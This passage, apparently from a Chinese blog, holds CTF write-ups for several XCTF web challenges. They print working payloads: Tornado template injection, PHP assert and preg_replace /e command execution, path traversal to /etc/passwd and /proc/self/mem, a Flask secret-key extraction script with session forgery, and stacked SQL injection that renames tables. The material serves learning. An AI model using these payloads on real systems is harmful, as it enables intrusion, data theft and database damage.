其中就包含了cookie_secret: 由RequestHandler.get_secure_cookie函数和set_secure_cookie函数用于对 cookie 进行签名。 所以可以访问到cookie_secret的函数有：RequestHandler.get_secure_cookie、RequestHandler.settings、self.application.settings、 访问 http://61.147.171.105:60053/error?msg={{RequestHandler.get_secure_cookie}} 突然发现不能直接用类名调用函数去访问到它settings，必须要用实例化的对象调用函数去访问，而handler就是处理当前这个页面的HTTP请求的RequestHandler对象 （另：在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，Handler对象指向的处理当前这个页面的RequestHandler对象。执行?msg={{datetime}} 还可以访问到datetime模块） 得到cookie_secret的值 所以我们直接访问handler.get_secure_cookie、handler.settings、handler.application.settings、 http://61.147.171.105:60053/error?msg={{handler.get_secure_cookie}} get_secure_cookie函数还是被过滤了 http://61.147.171.105:60053/error?msg={{handler.settings}} 成功找到 计算md5值 之后我们继续计算哈希值：md5(cookie_secret+md5(/fllllllllllllag)) 注意filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))中filename=/fllllllllllllag不是fllllllllllllag，少了个“/”得到的MD5值会会不一样的，前面的/flag.txt、/welcome.txt、/hints.txt文件MD5值也是32位的。 MD5在线加密 地址：http://www.jsons.cn/md5/s/ /fllllllllllllag经过32位小写MD5值加密： 3bf9f6cf685a6dd8defadabfb41a03a1 之后cookie_secret的值加上/fllllllllllllag经过32位小写MD5值： faaa34dd-fbe3-4b1b-9e2e-8071918f97453bf9f6cf685a6dd8defadabfb41a03a1 再经过一次32小写MD5值加密： 8b82faf703302b0590f91499236c86fa 得到flag 参考文章： wp参考一 wp参考二","categories":["攻防世界"]},{"title":"攻防世界-simple_js","path":"/2023/08/17/simple-js/","content":"题目描述： 小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 题目解题： 一个密码框，随便输入一个试试 说是假密码。。。，那看一下源代码 function dechiffre(pass_enc){ var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i &lt; (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;} for(i = (o=0); i &lt; (k = j = n); i++ ){ o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; k-1) p += String.fromCharCode((o = tab2[i])); } p += String.fromCharCode(tab2[17]); pass = p;return pass; } String[\"fromCharCode\"](dechiffre(\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\")); h = window.prompt('Enter password'); alert( dechiffre(h) ); 一个很纯粹的js代码，那肯定就要审计了，这里也是对我来说有点难，第一次遇到，那么就GPT和wp共同参考一下 一.代码定义了一个dechiffre函数，因为还没有调用，就先不理他了。 先将十六进制转换成字符串，使用网址：https://www.bejson.com/convert/ox2str/ 或者直接将十六进制参数放入python的print()中。即 s=\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\" print (s) 转换结果:55,56,54,79,115,69,114,116,107,49,50 二.执行了String[\"fromCharCode\"](dechiffre(\"55,56,54,79,115,69,114,116,107,49,50\")); 2.1 调用了dechiffre，执行了dechiffre函数将“\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30”作为参数带入dechiffre函数中执行。即： dechiffre(pass_enc) 2.2 接着定义了pass变量一大串，先放着 2.3 因为pass_enc=\"55,56,54,79,115,69,114,116,107,49,50\" 将pass_enc字符串分割成字符串数组，复制给tab参数所以: tab=[55,56,54,79,115,69,114,116,107,49,50] 注:tab此时是字符串数组!!! 2.4 随后 tab2等于 pass分割成的数组 tab2=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65] 2.5 变量赋值代码分析：var i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length; 一开始i，j，m，n，o没有赋值，为undefined，而其他参数l=0，p=\"\",后来 i 被赋值=0，j被赋值=11 2.6 k = j + (l) + (n=0); 因为n=0,所以k=11+0+0=11, 注这里的(l)是英文字母l，不是数字1 2.7 n = tab2.length; n等于tab2的长度18 所以n=18 2.8 第一个循环，精简一些代码： for(i =0; i &lt; (k = j = n); i++ ) //i =(o=0) 不就是 i=0嘛 ，真是服了,这段代码一大堆烟雾弹，后面那个更大 {o = tab[i-l]; p += String.fromCharCode((o = tab2[i])); if(i == 5)break;} 解释：前面的o=tab[i-1]是无用的，因为后面会被o=tab2[i]的值重新覆盖 烟雾弹+1 第一次循环：o=tab[0];p=p+String.fromCharCode((o = tab2[0]) tab2[0]=70,o=70 p=\"\"+String.fromCharCode(70) ==&gt;p=F ps：fromCharCode：将 Unicode 编码转为一个字符: 第二次... p=A 第三次... p=U 第四次... p=X 第五次... p= 所以，这个for循环，最后的p为（尽管没有输出出来，这里我们知道就好）FAUX P 2.9 第二个循环，精简一些代码： for(i = 0; i &lt; 18; i++ ){ //i =(o=0)不就是 i=0嘛 ，和上面的一样，烟雾弹+1 o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; 17) p += String.fromCharCode((o = tab2[i])); } 解释：这里的for循环和上面的差不多，注意这里的p值由于第一次for循环执行后现在已经是FAUX P了 加上第一次for循环的p值，最后的p为FAUX PASSWORD HAH 2.10 p += String.fromCharCode(tab2[17]); 因为tab2=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65] 所以：p=FAUX PASSWORD HAH + A 因此，最后的p为FAUX PASSWORD HAHA 2.11 pass = p;return pass; 即 pass = FAUX PASSWORD HAHA;return FAUX PASSWORD HAHA; 最后函数输出为FAUX PASSWORD HAHA 额。。这个函数就这样执行完了，tab数组也没有使用到！！一开始带入进来的参数pass_enc也没有用，，最后这个tab和其带入的参数就像个烟雾弹，迷惑人的。 在运行函数过程中也用到了分割后的tab数组（即带入的参数），但是经过for循环的一通乱绕，人家直接使用tab2数组相关代码的值，根本没有使用到tab数组的值， 所以由于代码逻辑问题，传入dechiffre函数的参数pass_enc是没有意义的，只是个烟雾弹。 三、dechiffre函数执行后，继续执行其他的代码 h = window.prompt('Enter password'); alert( dechiffre(h) ); h=你输入弹框的内容 之后alert弹出dechiffre(h)的值，由前面所有的代码分析可知，代码中的p值与tab无关，因为不论你输入什么最终都会被tab2的值替代。 所以不论pass_enc输入什么参数，输出的值都是会显示FAUX PASSWORD HAHA。 最后结论是，不论输入什么参数，都只会返回FAUX PASSWORD HAHA，所以flag可能会与输入dechiffre的参数有关:\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30 由上面分析已知，这一串参数转换为tab字符串数组为:[55,56,54,79,115,69,114,116,107,49,50] 注:tab此时是字符串数组！！！ 所以得抛弃前面的代码，重新编写代码来运行它，好吧其实是大佬写的，我不会！！！ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var n=String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50); document.write(n); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 最后结果是：786OsErtk12 根据题目的提示的Flag的格式，所以flag为：Cyberpeace{786OsErtk12} 函数说明： (1)split() 方法用于把一个字符串分割成字符串数组 语法：string.split(separator,limit) 参数 描述 separator 可选。字符串或正则表达式，从该参数指定的地方分割 string Object。比如此题以逗号分割成字符串数组 limit 可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。 举例：str=\"a,b,c,d,e,f,g\"; var 1st = str.split(\",\",3); 对str以逗号进行分割，分割后的字符串数组内的值最多只能有3个，结果就是1st = [a,b,c] (2)for 循环的语法如下： for (语句 1; 语句 2; 语句 3) { 要执行的代码块 } 语句 1 在循环（代码块）开始之前执行。 语句 2 定义运行循环（代码块）的条件。 语句 3 会在循环（代码块）每次被执行后执行。 (3)fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。 语法：String.fromCharCode(n1, n2, ..., nX) 参数 描述 n1, n2, ..., nX 必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。 (4)prompt()方法用于显示可提示用户进行输入的对话框。 这个方法返回用户输入的字符串 语法：prompt(msg,defaultText) 参数 描述 msg 可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）就是弹框显示文本。 defaultText 可选。默认的输入文本，你输入什么弹框一开始出现里面的输入框就会默认显示你这个文本。 (5)var i,j,k,l=0,m,n,o,p = \"\"; 这个表示声明变量i,j,k,l,m,n,o,p，只有l和p两个变量被赋值了，其它的变量都是不带值的，不带有值的变量，它的值将是undefined，后续代码中可以给它赋值。 (6)length length 属性可设置或返回数组中元素的数目。 文章参考： wp参考一","categories":["攻防世界"]},{"title":"攻防世界-mfw","path":"/2023/08/17/mfw/","content":"题目描述： 无 题目解题： 进入页面，一个个都点了点，没啥用的，查看url发现有个page参数，想着或许是文件包含，试了试没啥成果，于是想到扫网站，然后用dirsearch扫了一下，发现有git泄露，于是在后面添加/.git/访问看看 发现的确是git泄露，这时下载了这些文件发现都是乱码，不知道咋处理了，看了wp发现要利用工具来还原代码 Githack：工具下载(linux): git clone https://github.com/lijIEjIE/GitHack.git 命令：python GitHack.py http://61.147.171.105:63789/.git 成功下载，查看index.php，找到重要代码 &lt;?php if (isset($_GET['page'])) { $page = $_GET['page']; } else { $page = \"home\"; } $file = \"templates/\" . $page . \".php\"; // I heard '..' is dangerous! assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\"); // TODO: Make this look nice assert(\"file_exists('$file')\") or die(\"That file doesn't exist!\"); ?&gt; strpos()函数查找\"..\"在$file中第一次出现的位置。如果没有找到则返回false file_exists()函数检查$file是否存在 assert()函数会将括号中的字符当成代码来执行，并返回true或false 因此这里就是利用assert执行代码，那么就要想办法插入命令函数，因此构造如下payload 这里我们也知道flag在./templates/flag.php目录处 ?page=') or system('cat templates/flag.php');// 被传入之后变成： $file=\"templates/') or system('cat ./templates/flag.php');//.php\" strpos()返回false，再利用or让其执行system函数，再用\" // \"将后面的语句注释掉 assert(\"strpos('template/') or system('cat ./template/flag.php');//.php, '..') === false\") 下划线内容被注释掉了，所以真正执行了以下语句 strpos('template/') or system('cat ./template/flag.php'); 拿到flag 参考文章： wp参考","categories":["攻防世界"]},{"title":"攻防世界-ics-05","path":"/2023/08/17/ics-05/","content":"题目描述： 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统 题目解题： 进入页面之后，点来点去也就设备维护中心有东西，其他都是一样的页面 查看源代码发现有个get参数，我们传一下看看 这里我是直接想到的文件包含，如上图得到index.php的源码，我们解码看看 &lt;?php $page = $_GET[page]; if (isset($page)) { if (ctype_alnum($page)) { ?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;?php }else{ ?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt; &lt;?php if (strpos($page, 'input') &gt; 0) { die(); } if (strpos($page, 'ta:text') &gt; 0) { die(); } if (strpos($page, 'text') &gt; 0) { die(); } if ($page === 'index.php') { die('Ok'); } include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;?php }} //方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试 if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') { echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) { preg_replace($pattern, $replacement, $subject); }else{ die(); } } ?&gt; 重要代码如上，先解释一些不常见函数的含义 preg_replace — 执行一个正则表达式的搜索和替换 mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索subject中匹配pattern的部分， 以replacement进行替换。 preg_replace($pattern, $replacement, $subject)函数将subject中匹配到的replacement用pattern替换，如果启用/e参数的话，就会将replacement当做php代码执行。 $pattern: 要搜索的模式，可以是字符串或一个字符串数组、正则。 $replacement: 用于替换的字符串或字符串数组。 $subject: 要搜索替换的目标字符串或字符串数组。 /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向 引用替换完之后）。 提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 这里也是看了wp发现此处竟然可以命令执行，当时分析了半天不知道从哪入手。。。。 说明我们要给http的头部添加X-forwarded-For=127.0.0.1，即可利用上述的函数，bp修改也可以，这里我用hackbar修改 成功执行第一步 根据该函数的特性我们构造如下paylaod： ?pat=/abc/e&amp;rep=&lt;?php system('ls');?&gt;&amp;sub=abc //此处pat中的abc前有斜杠的原因是，符合正则表达式的开头，以匹配sub中的abc 查看可以文件s3chachaDir 这里估计flag还是文件夹，那么再次ls看看 如此，cat一下即可，F12看到flag 参考文章： wp参考一 wp参考二 伪协议参考","categories":["攻防世界"]},{"title":"攻防世界-lottery","path":"/2023/08/17/lottery/","content":"题目描述： 无 题目解题： 进入页面，发现是一个买东西的网站，点击play之后让我们注册账号，这里随便一个即可，注册完以后浏览一下 发现在该页面下，只有攒够钱才能买flag，不出意外就是逻辑漏洞了，结合题目给的附件，也就是源代码，我们先在购买页面随便购买，看看网站流量的动向 那么我们查看一下api.php 在这里发现，他将我们输入的数字与产生的随机数进行比较，比较相同数字的个数，进行对应钱数的增加，这里值得注意的是，这里用的是弱比较，并且没有对我们输入的东西进行过滤 这里注意一个PHP特性：布尔值true和任意字符串都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的，例如 var_dump(true==\"hyuf\") //true var_dump(True == 0); //bool(false) var_dump(True == 'False'); //bool(true) var_dump(True == 2); //bool(true) 由此，我们完全可以令输入的内容为一个包含7个true元素的数组，这样我们账户的余额一定是增加的，我们直接抓包修改 拿到flag 文章参考： wp参考","categories":["攻防世界"]},{"title":"攻防世界-catcat-new","path":"/2023/08/16/catcat-new/","content":"题目描述： catcat 题目解题： 进入首页随便点击一个图片，看到url如图，猜测就是文件包含了，测试了半天没啥头绪，还是看wp吧。。。 看了之后发现这是不会的点，那我们认真学习一番 文章说：一道有关任意文件读取，Linux敏感文件，flask-session伪造的题目 先看基础知识 1./etc/passwd 该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为 用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符） 2./proc/self proc是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中的数据。通过/proc/PID可以访问对应PID的进程内核数据，而/proc/self访问的是当前进程的内核数据。 3./proc/self/cmdline 该文件包含的内容为当前进程执行的命令行参数。 4./proc/self/mem /proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。 5./proc/self/maps /proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。 6.flask-session结构 flask_session是flask框架实现session功能的一个插件。其session结构分为三部分：序列化内容+时间+防篡改值，这三部分内容加密后以符号 “.”来进行分隔。flask_session默认session的储存是在用户Cookie中。但也可以指定存储在数据库，缓存中间件，服务器本地文件等等之中。 输入该payload：?file=../../../etc/passwd，确实存在漏洞 读取当前进程的命令行参数。?file=../../../../proc/self/cmdline，发现有一个通过python启动app.py的命令。 所以可以得出该网站使用Python框架，并且因为有app.py可知使用的是flask框架。 尝试读取app.py文件。 复制文本内容，将字符串f-string格式化输出美化一下。 import os import uuid from flask import Flask, request, session, render_template, Markup from cat import cat flag = \"\" app = Flask( #这部分代码导入了所需的模块，其中包括Flask、os、uuid等。创建了一个Flask应用实例，并设置了静态资源路径。 __name__, static_url_path='/', static_folder='static' ) app.config['SECRET_KEY'] = str(uuid.uuid4()).replace(\"-\", \"\") + \"*abcdefgh\" # 此处利用uuid.uuid4()生成了一串id字符串并在后面拼接*abcdefgh if os.path.isfile(\"/flag\"): # 导入flag文件并删除掉，cat函数作用是读取flag内容，赋值给flag变量 flag = cat(\"/flag\") os.remove(\"/flag\") @app.route('/', methods=['GET']) # / 路径的处理函数用于渲染首页模板，展示可用的\"cat\"列表。 def index(): detailtxt = os.listdir('./details/') cats_list = [] for i in detailtxt: cats_list.append(i[:i.index('.')]) return render_template(\"index.html\", cats_list=cats_list, cat=cat) @app.route('/info', methods=[\"GET\", 'POST'])# def info(): # /info 路径的处理函数接收GET或POST请求，从\"./details/\"目录下读取文件内容，并在详情页展示。 filename = \"./details/\" + request.args.get('file', \"\") start = request.args.get('start', \"0\") end = request.args.get('end', \"0\") name = request.args.get('file', \"\")[:request.args.get('file', \"\").index('.')] return render_template(\"detail.html\", catname=name, info=cat(filename, start, end)) @app.route('/admin', methods=[\"GET\"]) # 在session信息中admin=1的用户在/admin路径下访问网站可以获得flag，所以要伪造session。 def admin_can_list_root(): if session.get('admin') == 1: return flag else: session['admin'] = 0 return \"NoNoNo\" if __name__ == '__main__': app.run(host='0.0.0.0', debug=False, port=5637) 以上就是app.py的代码 flask_session的伪造需要用到secret_key，而secret_key的值可以通过内存数据获取。先读取/proc/self/maps文件获取可读内容的内存映射地址。 执行破解脚本 # coding=utf-8 # ---------------------------------- ################################### # Edited by lx56@blog.lxscloud.top ################################### # ---------------------------------- import requests import re import ast, sys from abc import ABC from flask.sessions import SecureCookieSessionInterface url = \"http://61.147.171.105:62610/\" # 此程序只能运行于Python3以上 if sys.version_info[0] &lt; 3: # &lt; 3.0 raise Exception('Must be using at least Python 3') # ----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ---------------- class MockApp(object): def __init__(self, secret_key): self.secret_key = secret_key class FSCM(ABC): def encode(secret_key, session_cookie_structure): # Encode a Flask session cookie try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \"[Encoding error] {}\".format(e) raise e # 由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key s_key = \"\" bypass = \"../..\" # 请求file路由进行读取 map_list = requests.get(url + f\"info?file={bypass}/proc/self/maps\")# 读取当前进程内容 map_list = map_list.text.split(\"\\ \") # 以换行符分开内容 for i in map_list: # 匹配指定格式的地址 map_addr = re.match(r\"([a-z0-9]+)-([a-z0-9]+) rw\", i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(\"Found rw addr:\", start, \"-\", end) # 设置起始和结束位置并读取/proc/self/mem res = requests.get(f\"{url}/info?file={bypass}/proc/self/mem&amp;start={start}&amp;end={end}\") # 用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey if \"*abcdefgh\" in res.text: # 正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh secret_key = re.findall(\"[a-z0-9]{32}\\*abcdefgh\", res.text) if secret_key: print(\"Secret Key:\", secret_key[0]) s_key = secret_key[0] break 有了secret_key后接下来就是伪造session，session在访问/admin路径时的cookie中。session为eyJhZG1pbiI6MH0.ZNzhIg.Z7MhkPlaNm3hajdIBv_AEL995xo 使用工具flask_session_cookie_manager伪造session。使用方法为： 解密 python flask_session_cookie_manager3.py decode -s “secret_key” -c “session” 加密 python flask_session_cookie_manager3.py encode -s “secret_key” -t “data” 执行如下payload python flask_session_cookie_manager3.py decode -s \"bd07849f5c4e4359843eb39758e389f0*abcdefgh\" -c \"eyJhZG1pbiI6MH0.ZNznXw.gl2UUGVxRJ7z7FgWD-jlsS_ETPE\" python flask_session_cookie_manager3.py encode -s \"bd07849f5c4e4359843eb39758e389f0*abcdefgh\" -t \"{'admin': 1}\" python flask_session_cookie_manager3.py encode -s “bd07849f5c4e4359843eb39758e389f0*abcdefgh” -t “{'admin': 1}” 得到伪造的session，使用burpsuite更改session并执行，得到flag。 这里不知为何，我认为我步骤一样的，但是复现不出来，最后找了一个一把梭的脚本，依旧是nonono，因而不纠结了，知道思路即可 上述脚本也是只能看懂，根本不会写。。。。只希望未来不在是脚本小子了 知识总结： flask_session伪造 伪造原理 flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。 通常情况下会和SSTI知识点同步考察。 利用方式 我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的SECRET_KEY 加解密脚本自取： https://github.com/noraj/flask-session-cookie-manager 使用方法 python2 脚本2.py decode -c \"session值\" -s \"key值\" python2 脚本2.py encode -s \"key值\" -t \"我们需要伪造的值\" python3 脚本3.py decode -c \"session值\" -s \"key值\" python3 脚本3.py encode -s \"key值\" -t \"我们需要伪造的值\" 所需要注意的地方就是python的版本不同所对应的脚本也不相同。 Flask的session格式 base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名 时间戳用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；签名是利用Hmac算法，将session数据和时间戳加上secret_key加密而成的，用来保证数据没有被修改。 由上文所述的session格式可知，要修改并伪造一个session的必要条件就是知道加密所采用的secret_key，一旦获取到secret_key, 我们就可以轻松的构造签名，从而实现客户端的session的伪造。 文章参考： 参考一 参考二 参考三","categories":["攻防世界"]},{"title":"攻防世界-warmup","path":"/2023/08/16/warmup/","content":"题目描述： 无 题目解题： 来到页面发现什么也没有，那么查看源代码看看 很明显了，访问一下看看 那么就是代码审计了 &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; //设置白名单 if (! isset($page) || !is_string($page)) { //判断page是否存在且是否为字符串类型 echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { //判断page是否在白名单中 return true; } $_page = mb_substr( //截取page变量?之前的内容 $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { //二次判断白名单 return true; } $_page = urldecode($page); //url解码 $_page = mb_substr( //二次?截取 $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) {//三次判断白名单 return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file'])//若file变量存在且为字符串类型，且在check函数中返回true，则包含file变量的内容 &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; } ?&gt; 很明显了，我们这里主要是绕过白名单检测即可也就是in_array函数，但我刚做的时候，一直以为要靠PHP特性绕过inarray函数，比如在后面加个#之类的，但走了一遍似乎没啥用，看了wp才醒悟，这里靠include特性即可，也就是目录穿越。 当然这里先看看hint提示 找到flag所在地 这里我们分析得知我们应该让第一次array检查返回false，随后到第二个array检查，这里截取?之前的内容，我们令这一步返回true，那么就不用管第三个array检查了 构造payload如下： ?file=source.php?ffffllllaaaagggg 结果没有任何反应，那就是目录问题了，这里看一下include特性 由此发现，如果我们在?后面加上相对路径…/，那么我们就会在当前目录开始寻找而忽略之前的source.php 后面就是尝试了，最终payload如下 ?file=source.php?../../../../../ffffllllaaaagggg 拿到flag","categories":["攻防世界"]},{"title":"攻防世界-supersqli","path":"/2023/08/14/supersqli/","content":"题目描述： 随便注 题目解题： 根据题目很显然是sql注入了 我们打开题目看看 正常输入1，也正常回显，随之输入1’发现报错，证实存在sql注入，且为单引号闭合 这里接着测试几波，发现#可以成功注释内容，接着先判断列数，根据报错情况，发现为2列 接着联合注入一下 1' union select 1, database() # 发现被正则过滤了，并且大小写，双写绕过也不行，update也过滤了，那我们尝试一下extract报错注入 1' and extractvalue(1,concat(0x7e,database())) # 成功执行！ 继续干 1' and extractvalue(1,concat(0x7e,database())) # 但又想到，关键词依旧是被过滤的，还是行不通，没思路了，看了wp发现，居然忘了堆叠注入，那就熟悉一下 1'; show databases; # 1'; use supersqli;show tables; # 1';use supersqli;show columns from `1919810931114514`;# 这里注意：纯数字为表名，要用反引号包裹 找到flag，到这一步就头疼了，本来要select的，不过被过滤了，思路没了，继续看wp，方法真多啊 方法一：sql预编译 参考：预编译 设置参数 set @sql = CONCAT('se','lect * from `1919810931114514`;'); 执行预编译SQL语句 prepare stmt from @sql; EXECUTE stmt; 合起来为 1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;# 。。。set也过滤了，不过幸好可以大小写绕过 1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;# 拿到flag，这里也是因为这道题开启了sql预编译，不然这方法行不通 方法二：改列名 我们查询words列发现结构大致相同，由于注入框的查询是对列id的搜索，此时参考两个表的列名，需要将flag列名改为能够查找的id列（修改包括名称和数据类型）。 1';use supersqli;show columns from words;# 接下来输入： 1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);# GPT分析一波上述sql语句 这个SQL语句看起来像是一个恶意的SQL注入攻击尝试，试图通过修改数据库表的名称和字段来实现某种目的。让我逐步解析这个语句中的每一部分： 1. `1';rename tables `words` to `words1`;` 这一部分首先以数字1开始，然后接着使用了分号来终止前一个查询语句。接下来，它试图通过`rename tables`命令将数据库表`words`重命名为`words1`。这是一个典型的SQL注入攻击手法，旨在执行恶意的数据库操作。 2. `rename tables `1919810931114514` to `words`;` 在这里，攻击者试图将表名`1919810931114514`重命名为`words`，继续利用`rename tables`命令进行表操作。 3. `alter table `words` change `flag` `id` varchar(100);` 这一部分使用`alter table`命令，试图修改名为`words`的表，将其字段`flag`更改为名为`id`的新字段，类型为`varchar(100)`。这也是一个恶意操作的尝试，可能会破坏数据库的结构和数据。 4. `#` 井号（#）表示注释，此后的内容将被视为注释而不被执行。 总之，这个SQL语句的目的似乎是通过重命名表和修改字段来对数据库进行恶意操作。这种类型的攻击可能会导致数据损坏、数据泄露以及系统崩溃等问题。在开发和维护应用程序时，务必采取必要的安全措施，如使用参数化查询、输入验证和避免动态构建SQL语句，以防范SQL注入等安全风险。 那这里我们直接万能语句1’ or 1=1#就可以了，毕竟flag现在在id字段里，但这里似乎flag的id字段默认为0了，以至于我们可以查出来，但GPT说这里默认应为null。不过使用万能语句，即可查询到sql中所有字段数对应的数据 方法三：改列名-另类方法 第二个方法是将两个表列名互换，查询语句不变的情况下，会直接查询words表中内容。 RENAME TABLE tbl_name TO new_tbl_name 将表tbl_name的名字改成new_tbl_name。 由于注入框的查询是对列id的搜索，此时参考两个表的列名，需要将flag列名改为能够查找的id列（修改包括名称和数据类型）。 ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL; 具体为什么修改为CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL就是数据库数据类型的问题了。 将操作连贯起来，构造Payload。 1’;RENAME TABLE words TO word;RENAME TABLE 1919810931114514 TO words;ALTER TABLE words CHANGE flag id VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;SHOW columns FROM words; 1';RENAME TABLE `words` TO `word`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;SHOW columns FROM words; 到这里我们的表列名就已经修改完毕，此时还会输出修改完成的words列名，最后通过万能钥匙1’ or ‘1’='1即可得到输出。 参考文章： 参考一 参考二","categories":["攻防世界"]},{"title":"攻防世界-Web_php_include","path":"/2023/08/14/web-php-include/","content":"题目描述： 无 题目解题： 根据题目信息，很明显是文件包含，这里附上源码 &lt;?php show_source(__FILE__); echo $_GET['hello']; $page=$_GET['page']; while (strstr($page, \"php://\")) { $page=str_replace(\"php://\", \"\", $page); } include($page); ?&gt; strstr-函数解析 这里也就是get传参之后，判断参数中是否有指定字符，有的话将其替换为空 这里看到echo的地方，以为还要变量覆盖啥的来输出内容，不过似乎行不通，那就用其他伪协议吧 